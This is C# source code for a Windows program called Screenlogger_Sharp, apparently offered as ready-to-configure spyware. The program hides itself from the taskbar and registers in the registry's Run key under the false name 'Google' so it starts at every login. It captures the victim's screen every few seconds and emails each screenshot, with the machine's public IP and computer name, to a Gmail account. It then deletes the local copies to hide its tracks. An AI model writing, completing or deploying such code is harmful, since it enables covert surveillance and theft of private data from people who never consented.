using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Threading;
using Microsoft.Win32;

namespace Screenlogger_Sharp
{
    public partial class Form1 : Form
    {
        int i = 1, a = 1;
        bool send = false;
        private MailMessage email;
        public Form1()
        {
            InitializeComponent();
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;

            if (pictureBox1.Image != null)
                pictureBox1.Image.Dispose();
        }
        public void Inicializar()
        {
            RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            reg.SetValue("Google", Application.ExecutablePath.ToString());
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            Inicializar();

            string diretorio = @"C:\Windows\ILC\";
            if (!Directory.Exists(diretorio))
            {
                Directory.CreateDirectory(diretorio);
            }
            else
            {

                DirectoryInfo di = new DirectoryInfo(diretorio);
                foreach (FileInfo file in di.GetFiles())
                {
                    file.Delete();
                }
                Directory.Delete(diretorio);
                Thread.Sleep(1000);
                Directory.CreateDirectory(diretorio);
            }
            Manage();
        }
        public void Manage()
        {
            while(true)
            {
                TakePic();
                SendPic();
                Thread.Sleep(2000);
                DeletePic();
                Thread.Sleep(7000);
            }
        }
        public void TakePic()
        {
            Bitmap bw = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bw);
            g.CopyFromScreen(0, 0, 0, 0, bw.Size);
            pictureBox1.Image = bw;
            bw.Save(@"C:\Windows\ILC\" + i++ + ".jpeg");
            bw.Dispose();
        }
        public void SendPic()
        {
            try
            {
                string hora = DateTime.Now.ToShortTimeString();
                string data = DateTime.Now.ToShortDateString();
                string ip;
                try
                {
                    using (WebClient web = new WebClient())
                    {
                        ip = web.DownloadString("https://wtfismyip.com/text"); //get IP
                    }
                }
                catch (Exception)
                {
                    ip = "Error";
                }
                var NomePc = Environment.MachineName;
                email = new MailMessage();
                email.To.Add(new MailAddress("YOURMAIL"));
                email.From = new MailAddress("YOURMAIL");
                email.Subject = "New Pic";
                email.IsBodyHtml = true;
                email.Body = data + " <br> " + hora + "<br>IP: " + ip + "<br>Máquina: " + NomePc;

                System.Net.Mail.Attachment aa;
                aa = new System.Net.Mail.Attachment(@"C:\Windows\ILC\" + a++ + ".jpeg");
                email.Attachments.Add(aa);

                SmtpClient cliente = new SmtpClient();
                cliente.Credentials = new System.Net.NetworkCredential("YOURMAIL", "YOURPASS");
                cliente.Host = "smtp.gmail.com"; //case using gmail
                cliente.Port = 587;
                cliente.EnableSsl = true;
                cliente.Send(email);
                aa.Dispose();
                email.Dispose();
                send = true;
            }
            catch (Exception) { }
        }
        int k = 0;
        public void DeletePic()
        {
            while (true)
            {
                if (send)
                {
                    try
                    {
                        k++;
                        File.Delete(@"C:\Windows\ILC\" + k + ".jpeg");
                        send = false;
                        break;
                    }
                    catch (Exception) { }
                }
            }
        }
      
    }
}
